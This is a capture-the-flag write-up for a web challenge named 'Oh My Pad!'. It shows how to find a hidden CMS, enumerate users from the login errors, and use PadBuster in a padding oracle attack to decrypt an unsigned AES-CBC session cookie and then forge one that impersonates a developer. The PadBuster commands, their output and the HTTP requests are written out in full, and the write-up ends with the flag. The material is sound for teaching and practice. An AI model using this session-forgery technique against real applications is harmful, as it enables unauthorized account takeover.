## Oh My Pad!

### Description

> The third-party developers of The Fancy Company left their bepoke content management console lying around. Find it and gain elevated access to it!

### Solution

Solving the challenge requires three steps. 

#### 1. Find the CMS login page

First, the dev console must be found in `/cms`. This is easily achieved by an educated guess from the challenge description or by observing the robots.txt file:

```
/robots.txt:

User-agent: *
Disallow: /cms/
```

Here we can find a login page for 'The Fancy Company CMS'


#### 2. Enumerate a valid user

By accessing the CMS URL, the challengee is presented with a simple login form expecting username and password. The page source code revelas some useful information left in the HTML comments by the developers:

```
<!--
    CHANGES v.11.2018:
        - kmccormick: Upgraded to jQuery 2.1.1 
        - kmccormick: fixed bugs: BUG-10283 and BUG-10211
        - ecartman: added test account (test:test) currently set without any privileges

    ROADMAP v.04.2019:
        - Current bespoke session implementation (using aes-cbc w/o signing) should be improved. Consider migrating to "express-session".
        - add self-registration for trial users
        - upgrade node.js (check with kbroflowski)
-->
```

The relevant information found here is:
  - A test user account (username and password `test`)
  - User names of developers (kmccormick, ecartman, kbroflowski)
  - The current CMS session implementation uses AES-CBC without any signing of the payload. 

#### 3. Gaining high-privileged authenticated access to the CMS

The validity of the aforementioned developer names can be confirmed via the login page. For invalid login names, the app returns the message "Invalid User". If the user name does exist in the app but an incorrect password was provided, the app returns "Invalid Password" instead.

Upon authentication with the test user account, the challenge can observe the session that is created and returned in a cookie:

```
POST /login HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://127.0.0.1/cms/
Content-Type: application/x-www-form-urlencoded
Content-Length: 19
Connection: close
Cookie: SESSION=79FCC8DB63D3D2134067998A71FE2C3456F598FDA4FA50ADBBD9719BC696F7F397070A4DED025684D02B91BDD61EB783CF44E06EE3D35C8B36AEDAEC4D0DC81B
Upgrade-Insecure-Requests: 1

user=test&pass=test

HTTP/1.1 302 Found
X-Powered-By: Express
Set-Cookie: SESSION=39AE004427F6A2E472811C3D793D6852D944E5302F1AF9ADBB0D51BCA5CD91AC62870DEF239A113D0283FD12325DFCB6861912E229417D1B89752E516622E13E; path=/; httponly
Location: /portal
Vary: Accept
Content-Type: text/html; charset=utf-8
Content-Length: 58
Date: Mon, 21 Jan 2019 09:22:57 GMT
Connection: close

<p>Found. Redirecting to <a href="/portal">/portal</a></p>
```


With that session cookie, an authenticated user cann access the CMS portal page which only presents them with the string "Hello test".

Knowing that the session token is generated using AES-CBC and no signature to veritfy the integrity, the challengee can tamper with the ciphertext.

They will soon discover that there are 3 possible outcomes:

  1. The session token is valid and the greeting text in the portal is displayed
  2. The session token is invalid, the app will redirect the user to the login page
  3. The session token could not be decrypted by the app and and error is thrown

Providing that case (3) arose after tampering with the ciphertext but not changing any of its length, it is fair to assume that the error was caused due to some padding issues. The title of the challenge is also hinting this. 

The 3 different outcomes observed earlier all1ow tampering with the the Padding to reveal the plain text of the session token. A popular tool to carry out such Padding Oracle attacks is padbuster (https://github.com/GDSSecurity/PadBuster) 

```
$ perl padbuster.pl http://127.0.0.1/portal 39AE004427F6A2E472811C3D793D6852D944E5
302F1AF9ADBB0D51BCA5CD91AC62870DEF239A113D0283FD12325DFCB6861912E229417D1B89752E516622E13E 16 -cookies SESSION=39AE004427F6A2E472811C3D793D6852D944E
5302F1AF9ADBB0D51BCA5CD91AC62870DEF239A113D0283FD12325DFCB6861912E229417D1B89752E516622E13E -encoding 2

+-------------------------------------------+
| PadBuster - v0.3.3                        |
| Brian Holyfield - Gotham Digital Science  |
| labs@gdssecurity.com                      |
+-------------------------------------------+

INFO: The original request returned the following
[+] Status: 200
[+] Location: N/A
[+] Content Length: 11

INFO: Starting PadBuster Decrypt Mode
*** Starting Block 1 of 3 ***

INFO: No error string was provided...starting response analysis

*** Response Analysis Complete ***

The following response signatures were returned:

-------------------------------------------------------
ID#     Freq    Status  Length  Location
-------------------------------------------------------
1       1       200     20      /
2 **    255     500     38      N/A
-------------------------------------------------------

Enter an ID that matches the error condition
NOTE: The ID# marked with ** is recommended : 2

Continuing test with selection 2

{...snip...}

Block 3 Results:
[+] Cipher Text (HEX): 861912e229417d1b89752e516622e13e
[+] Intermediate Bytes (HEX): 4ce368e22e971c300f8ef01f3f50f1bb
[+] Plain Text: .de

-------------------------------------------------------
** Finished ***

[+] Decrypted value (ASCII): baced09eec5e087d|test|test@nviso.de

[+] Decrypted value (HEX): 626163656430396565633565303837647C746573747C74657374406E7669736F2E64650D0D0D0D0D0D0D0D0D0D0D0D0D

[+] Decrypted value (Base64): YmFjZWQwOWVlYzVlMDg3ZHx0ZXN0fHRlc3RAbnZpc28uZGUNDQ0NDQ0NDQ0NDQ0N
```


The decrypted session token value is:

`baced09eec5e087d|test|test@nviso.de`

Is is comprised of three parts each separated with `|`. A difficulty here might be interpreting the components. When decrypting several tokens it would be evident that the first part is solely a nonce that has no further relevancy. The username in the middle refers to the user’s login name and is the crucial part. 

Using padbuster, plaintext can also be encrypted. With the knowledge of valid usernames confirmed in step 3, the following plaintext should be encrypted (any of the other valid login names work as well):

`baced09eec5e087d|kbroflowski|test@nviso.de`

```
perl padbuster.pl http://127.0.0.1/portal 39AE004427F6A2E472811C3D793D6852D944E5302F1AF9ADBB0D51BCA5CD91AC62870DEF239A113D0283FD12325DFCB6861912E229417D1B89752E516622E13E 16 -cookies SESSION=39AE004427F6A2E472811C3D793D6852D944E5302F1AF9ADBB0D51BCA5CD91AC62870DEF239A113D0283FD12325DFCB6861912E229417D1B89752E516622E13E -encoding 2 -plaintext "baced09eec5e087d|kbroflowski|tes
t@nviso.de"

{...snip...}

-------------------------------------------------------
** Finished ***

[+] Encrypted value is: 5C91F48DB75CD99880E8E72A5A92452C36D67081213E6E0D49ECC9D5D66E879807DF9582875C1F29713D78C6E3DA1B9500000000000000000000000000000000
```

The new session token is used with the app, grants authenticated developer access and thus reveals the tropy:


```
GET /portal HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://127.0.0.1/cms/
Connection: close
Cookie: SESSION=5C91F48DB75CD99880E8E72A5A92452C36D67081213E6E0D49ECC9D5D66E879807DF9582875C1F29713D78C6E3DA1B9500000000000000000000000000000000
Upgrade-Insecure-Requests: 1

HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
Content-Length: 44
ETag: W/"2c-Q/m8ca3L0kM24yaoDyWCk85e73c"
Date: Mon, 21 Jan 2019 09:59:00 GMT
Connection: close

Hello kbroflowski!<br/> Trophy: [...]
```


### Flag
`CSC{e7e03bf87f1dc209972aa47963d40cfa}`


### Creator
Nico Leidecker

